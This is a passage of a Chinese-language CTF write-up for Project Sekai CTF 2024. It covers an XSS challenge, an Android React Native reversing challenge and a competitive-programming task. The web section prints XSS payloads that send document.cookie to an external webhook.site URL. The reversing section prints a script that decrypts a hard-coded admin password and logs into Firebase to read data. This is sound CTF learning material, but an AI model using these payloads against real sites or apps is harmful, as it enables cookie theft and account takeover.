<span class="string">`</span></span><br><span class="line"><span class="string">        &lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;</span></span><br><span class="line"><span class="string">            &lt;title&gt;Display&lt;/title&gt;</span></span><br><span class="line"><span class="string">            &lt;link href=&quot;https://fonts.googleapis.com/css?family=Press+Start+2P&quot; rel=&quot;stylesheet&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;style&gt;</span></span><br><span class="line"><span class="string">                body &#123;</span></span><br><span class="line"><span class="string">                    font-family: &#x27;Press Start 2P&#x27;, cursive;</span></span><br><span class="line"><span class="string">                    color: #212529; </span></span><br><span class="line"><span class="string">                    padding: 10px; </span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">            &lt;/style&gt;</span></span><br><span class="line"><span class="string">        &lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;</span></span><br><span class="line"><span class="string">            <span class="subst">$&#123;sanitizedInput&#125;</span></span></span><br><span class="line"><span class="string">        &lt;/body&gt;</span></span><br><span class="line"><span class="string">    `</span>;</span><br><span class="line">    iframe.<span class="property">contentWindow</span>.<span class="property">document</span>.<span class="title function_">open</span>(<span class="string">&#x27;text/html&#x27;</span>, <span class="string">&#x27;replace&#x27;</span>);</span><br><span class="line">    iframe.<span class="property">contentWindow</span>.<span class="property">document</span>.<span class="title function_">write</span>(iframeContent);</span><br><span class="line">    iframe.<span class="property">contentWindow</span>.<span class="property">document</span>.<span class="title function_">close</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fulldisplay &amp;&amp; sanitizedInput) &#123;</span><br><span class="line">        <span class="keyword">var</span> tab = <span class="title function_">open</span>(<span class="string">&quot;/&quot;</span>)</span><br><span class="line">        tab.<span class="property">document</span>.<span class="title function_">write</span>(iframe.<span class="property">contentWindow</span>.<span class="property">document</span>.<span class="property">documentElement</span>.<span class="property">innerHTML</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">autoDisplay</span>(); </span><br></pre></td></tr></table></figure>
<p>呵呵，有趣了，所有的html tag都會被過濾，不過其實在瀏覽器上可以使用<code>&lt;img src=&#39;meowmeow.jpg&#39;</code>之類的方法插入一個html tag，但也只有一個可以插 :D<br>那不管，先來想想用現有的材料可以怎麼玩ㄅ<br>一開始的想法是利用 iframe 的 srcdoc inject 一段javascript程式碼就好，防止html標籤被過濾甚至可以用 src 再加上<code>data:text/html;base64,</code>把他編碼，於是先嘗試這段payload：  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:5000/?auto_input=%3Ciframe%20src=%22data:text/html;base64,PHNjcmlwdCBzcmM9Imh0dHA6Ly8xMjcuMC4wLjE6NTAwMC8qKi9hbGVydCgxKTsvLy5qcyIvPg==%22</span><br></pre></td></tr></table></figure>
<p>把<code>&lt;script src=&quot;http://127.0.0.1:5000/**/alert(1);//.js&quot; &gt;&lt;/script&gt;</code>base64 encode，然後自己塞一個初始化就有js的frame就彈出來ㄌ，然而…有這麼容易嗎?<br><img src="https://hackmd.io/_uploads/Hk2pU_OiR.png" alt="image"><br>並沒有，再塞入像是 <code>&lt;script src=&quot;http://127.0.0.1:5000/**/location.href=&#39;https://webhook.site/d37cfcd6-38b3-4333-affe-c5ca094a0f5a/&#39;+document.cookie;//.js&quot; &gt;&lt;/script&gt;</code> 這樣的payload試著偷cookie後就發現轉不出去，為什麼呢?<br><img src="https://hackmd.io/_uploads/rkwKwOOjA.png" alt="image"><br>因為iframe內部的location並不是網站的location，導致他根本不能吃網站的location…<br>回去看一下404頁面，其實他能做的不只有任意的js，在瀏覽器裡面，他會根據前面的內容決定用什麼方法Render資訊(譬如說xml, html還是單純文字輸出)，所以最後的做法就是把xss透過404 page inject進去，最後再去iframe他，規避掉&lt;&gt;過濾的方法可以用urlencode就好：<br>final payload:  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:5000/?auto_input=%3Ciframe%20src%3D%22http%3A%2F%2F127.0.0.1%3A5000%2F%26lt%3Bscript%20src%3D%26quot%3Bhttp%3A%2F%2F127.0.0.1%3A5000%2F%2A%2A%2F%20location.href%3D%26%2339%3Bhttps%3A%2F%2Fwebhook.site%2Fd37cfcd6-38b3-4333-affe-c5ca094a0f5a%2Fa%26%2339%3B%2Bdocument.cookie%3B%2F%2F.js%26quot%3B%26gt%3B%26lt%3B%2Fscript%26gt%3B%22</span><br></pre></td></tr></table></figure>
<p>然後再url encode一次(bot會把他先decode再送去瀏覽器)<br>欸…不是啊，所以前面iframe那麼多在幹嘛?<br><del>直接丟一個</del><code>http://127.0.0.1:5000/&lt;script src=&quot;http://127.0.0.1:5000/**/ fetch(&#39;https://webhook.site/d37cfcd6-38b3-4333-affe-c5ca094a0f5a/&#39;+document.cookie);//.js&quot;&gt;&lt;/script&gt;</code>結束這回合不就得了…?<br><img src="https://hackmd.io/_uploads/SyMC-K_iA.png" alt="image"></p>
<p>喔對，他沒給bot GUI介面，自己發CURL<br><img src="https://hackmd.io/_uploads/BJqxcO_sR.png" alt="image"><br>好啦因為走遠路多學了好多東西，分享一下&gt;W&lt;  </p>
<blockquote>
<p>FLAG: SEKAI{w4rmUpwItHoUtTags}</p>
</blockquote>
<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="Crack-Me"><a href="#Crack-Me" class="headerlink" title="Crack Me"></a>Crack Me</h3><blockquote>
<p>Solver: Whale120</p>
</blockquote>
<p>先丟 <a target="_blank" rel="noopener" href="https://www.decompiler.com/jar/7028603f8f0f482eb1f757ffefee74aa/CrackMe.apk">decompile(link)</a><br>首先起手式逛了一下<code>/sources/com/SekaiCTF/CrackMe</code>，沒有東西…<br>痾…直接裝起來看ㄅ：<br><img src="https://hackmd.io/_uploads/S1BOTnuiR.png" alt="image"><br>Ok，登入頁面那邊有個是不是Admin的提示，grep一下Admin這個字串找檔案，發現 <code>./resources/assets/index.android.bundle</code><br>參考<a target="_blank" rel="noopener" href="https://book.jorianwoltjer.com/mobile/reversing-apks#react-native">這篇(link)</a><br>拆開來翻找一下找到<code>443.js</code>，看起來蠻有趣的。<br>觀察這一段程式碼：<br><img src="https://hackmd.io/_uploads/rkfZGpdiR.png" alt="image">  </p>
<p>上面這段也點了從哪裡抓flag  </p>
<p><img src="https://hackmd.io/_uploads/HyeVfadoC.png" alt="image"></p>
<p>看起來邏輯長這樣：從477.js initial了app、也會從456.js抓key和iv出來做加密，所以把這些資訊摳出來：<br><strong>477.js</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> c = &#123;</span><br><span class="line">  <span class="attr">apiKey</span>: <span class="string">&#x27;AIzaSyCR2Al5_9U5j6UOhqu0HCDS0jhpYfa2Wgk&#x27;</span>,</span><br><span class="line">  <span class="attr">authDomain</span>: <span class="string">&#x27;crackme-1b52a.firebaseapp.com&#x27;</span>,</span><br><span class="line">  <span class="attr">projectId</span>: <span class="string">&#x27;crackme-1b52a&#x27;</span>,</span><br><span class="line">  <span class="attr">storageBucket</span>: <span class="string">&#x27;crackme-1b52a.appspot.com&#x27;</span>,</span><br><span class="line">  <span class="attr">messagingSenderId</span>: <span class="string">&#x27;544041293350&#x27;</span>,</span><br><span class="line">  <span class="attr">appId</span>: <span class="string">&#x27;1:544041293350:web:2abc55a6bb408e4ff838e7&#x27;</span>,</span><br><span class="line">  <span class="attr">measurementId</span>: <span class="string">&#x27;G-RDD86JV32R&#x27;</span>,</span><br><span class="line">  <span class="attr">databaseURL</span>: <span class="string">&#x27;https://crackme-1b52a-default-rtdb.firebaseio.com&#x27;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">exports</span>.<span class="property">default</span> = c;</span><br></pre></td></tr></table></figure>
<p><strong>456.js</strong>  </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> _ = &#123;</span><br><span class="line">  <span class="attr">LOGIN</span>: <span class="string">&#x27;LOGIN&#x27;</span>,</span><br><span class="line">  <span class="attr">EMAIL_PLACEHOLDER</span>: <span class="string">&#x27;user@sekai.team&#x27;</span>,</span><br><span class="line">  <span class="attr">PASSWORD_PLACEHOLDER</span>: <span class="string">&#x27;password&#x27;</span>,</span><br><span class="line">  <span class="attr">BEGIN</span>: <span class="string">&#x27;CRACKME&#x27;</span>,</span><br><span class="line">  <span class="attr">SIGNUP</span>: <span class="string">&#x27;SIGN UP&#x27;</span>,</span><br><span class="line">  <span class="attr">LOGOUT</span>: <span class="string">&#x27;LOGOUT&#x27;</span>,</span><br><span class="line">  <span class="attr">KEY</span>: <span class="string">&#x27;react_native_expo_version_47.0.0&#x27;</span>,</span><br><span class="line">  <span class="attr">IV</span>: <span class="string">&#x27;__sekaictf2023__&#x27;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">exports</span>.<span class="property">default</span> = _;</span><br></pre></td></tr></table></figure>
<p>先從456.js的資訊還原密碼  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">KEY = <span class="string">&#x27;react_native_expo_version_47.0.0&#x27;</span></span><br><span class="line">IV = <span class="string">&#x27;__sekaictf2023__&#x27;</span></span><br><span class="line"></span><br><span class="line">key_bytes = KEY.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">iv_bytes = IV.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ciphertext_hex = <span class="string">&#x27;03afaa672ff078c63d5bdb0ea08be12b09ea53ea822cd2acef36da5b279b9524&#x27;</span></span><br><span class="line">ciphertext_bytes = binascii.unhexlify(ciphertext_hex)</span><br><span class="line">cipher = AES.new(key_bytes, AES.MODE_CBC, iv_bytes)</span><br><span class="line">decrypted = unpad(cipher.decrypt(ciphertext_bytes), AES.block_size)</span><br><span class="line">decrypted_password = decrypted.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(decrypted_password)</span><br></pre></td></tr></table></figure>
<p>解出來是<code>s3cr3t_SEKAI_P@ss</code>  </p>
<p>拿到資訊之後上網看一下怎麼連，然後<del>求助億下ChatGPT</del>，最後寫出腳本撈flag  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">api_key = <span class="string">&quot;AIzaSyCR2Al5_9U5j6UOhqu0HCDS0jhpYfa2Wgk&quot;</span></span><br><span class="line">database_url = <span class="string">&quot;https://crackme-1b52a-default-rtdb.firebaseio.com&quot;</span></span><br><span class="line"></span><br><span class="line">email = <span class="string">&quot;admin@sekai.team&quot;</span></span><br><span class="line">password = <span class="string">&quot;s3cr3t_SEKAI_P@ss&quot;</span></span><br><span class="line"></span><br><span class="line">login_url = <span class="string">f&quot;https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<span class="subst">&#123;api_key&#125;</span>&quot;</span></span><br><span class="line">login_payload = &#123;</span><br><span class="line">    <span class="string">&quot;email&quot;</span>: email,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: password,</span><br><span class="line">    <span class="string">&quot;returnSecureToken&quot;</span>: <span class="literal">True</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">login_response = requests.post(login_url, data=json.dumps(login_payload), headers=&#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>&#125;)</span><br><span class="line">login_response.raise_for_status()</span><br><span class="line"></span><br><span class="line">id_token = login_response.json().get(<span class="string">&quot;idToken&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> id_token:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&quot;Failed to get ID Token&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Login successful&quot;</span>)</span><br><span class="line"></span><br><span class="line">user_id = login_response.json().get(<span class="string">&quot;localId&quot;</span>)</span><br><span class="line">flag_path = <span class="string">f&quot;/users/<span class="subst">&#123;user_id&#125;</span>/flag&quot;</span></span><br><span class="line"></span><br><span class="line">data_url = <span class="string">f&quot;<span class="subst">&#123;database_url&#125;</span><span class="subst">&#123;flag_path&#125;</span>.json?auth=<span class="subst">&#123;id_token&#125;</span>&quot;</span></span><br><span class="line">response = requests.get(data_url)</span><br><span class="line"><span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">    flag_data = response.json()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Flag: <span class="subst">&#123;flag_data&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Error retrieving data: <span class="subst">&#123;response.status_code&#125;</span> <span class="subst">&#123;response.text&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/S1F346djR.png" alt="image">  </p>
<blockquote>
<p>Flag: SEKAI{15_React_N@71v3_R3v3rs3_H@RD???}</p>
</blockquote>
<h2 id="PPC"><a href="#PPC" class="headerlink" title="PPC"></a>PPC</h2><p>WTF?<br>CTF比賽打競程，認真?<br>對 :D，主辦2022的時候的題目沒用到覺得很可惜 …  </p>
<h3 id="Miku-vs-Machine"><a href="#Miku-vs-Machine" class="headerlink" title="Miku vs. Machine"></a>Miku vs. Machine</h3><blockquote>
<p>Solver: Whale120</p>
</blockquote>
<p>題目敘述：<br><img src="https://hackmd.io/_uploads/r1daJtuoC.png" alt="image"></p>
<p>基本上我的做法就是直接構造l&#x3D;n，然後for迴圈刷過去每場安排每個id的表演者都表演n單位時間直到他現在的總表演時間加起來已經夠了，那就切下一位表演者，簡單的乘除就可以知道這樣的構造一定會對。<br><strong>solve.cpp</strong>  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> n, m, cur, amt;</span><br><span class="line">    cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">    amt=m;</span><br><span class="line">    cur=<span class="number">1</span>;</span><br><span class="line">    cout &lt;&lt; n &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(amt &gt;= n)&#123;</span><br><span class="line">            cout &lt;&lt; n &lt;&lt; <span class="string">&#x27; &#x27;</span> &lt;&lt; cur &lt;&lt; <span class="string">&#x27; &#x27;</span> &lt;&lt; <span class="number">0</span> &lt;&lt; <span class="string">&#x27; &#x27;</span> &lt;&lt; cur &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">            amt-=n;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            cout &lt;&lt; amt &lt;&lt; <span class="string">&#x27; &#x27;</span> &lt;&lt; cur &lt;&lt; <span class="string">&#x27; &#x27;</span> &lt;&lt; n-amt &lt;&lt; <span class="string">&#x27; &#x27;</span> &lt;&lt; cur+<span class="number">1</span> &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">            cur++;</span><br><span class="line">            amt=m-(n-amt);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> t;</span><br><span class="line">    cin &gt;&gt; t;</span><br><span class="line">    <span class="keyword">while</span>(t--)&#123;</span><br><span class="line">        <span class="built_in">solve</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/HyA3eK_iC.png" alt="image"></p>
<blockquote>
<p>Flag: SEKAI{t1nyURL_th1s:_6d696b75766d}</p>
</blockquote>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/search/">Search</a></li>
        
          <li><a href="/tags/">tags</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-number">1.1.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Tagless"><span class="toc-number">1.1.1.</span> <span class="toc-text">Tagless</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse"><span class="toc-number">1.2.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Crack-Me"><span class="toc-number">1.2.1.</span> <span class="toc-text">Crack Me</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PPC"><span class="toc-number">1.3.</span> <span class="toc-text">PPC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Miku-vs-Machine"><span class="toc-number">1.3.1.</span> <span class="toc-text">Miku vs. Machine</span></a></li></ol></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2024/08/26/2024-sekaictf/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2024/08/26/2024-sekaictf/&text=Project Sekai CTF 2024 Writeup by ICEDTEA"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2024/08/26/2024-sekaictf/&title=Project Sekai CTF 2024 Writeup by ICEDTEA"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2024/08/26/2024-sekaictf/&is_video=false&description=Project Sekai CTF 2024 Writeup by ICEDTEA"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Project Sekai CTF 2024 Writeup by ICEDTEA&body=Check out this article: http://wha13.github.io/2024/08/26/2024-sekaictf/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2024/08/26/2024-sekaictf/&title=Project Sekai CTF 2024 Writeup by ICEDTEA"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2024/08/26/2024-sekaictf/&title=Project Sekai CTF 2024 Writeup by ICEDTEA"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2024/08/26/2024-sekaictf/&title=Project Sekai CTF 2024 Writeup by ICEDTEA"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2024/08/26/2024-sekaictf/&title=Project Sekai CTF 2024 Writeup by ICEDTEA"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2024/08/26/2024-sekaictf/&name=Project Sekai CTF 2024 Writeup by ICEDTEA&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2024/08/26/2024-sekaictf/&t=Project Sekai CTF 2024 Writeup by ICEDTEA"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2023-2024
    William Lin
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
